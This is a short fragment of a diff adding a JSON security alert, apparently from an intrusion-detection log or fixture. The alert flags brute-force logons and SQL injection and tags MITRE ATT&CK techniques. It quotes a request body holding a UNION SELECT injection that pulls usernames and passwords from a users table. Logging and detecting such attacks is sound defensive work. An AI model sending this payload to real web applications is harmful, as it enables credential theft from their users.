+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.170. Detections: Brute-force logon attempts, SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1110, T1190. [vpn-gw-06] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    }
+  ]
+}
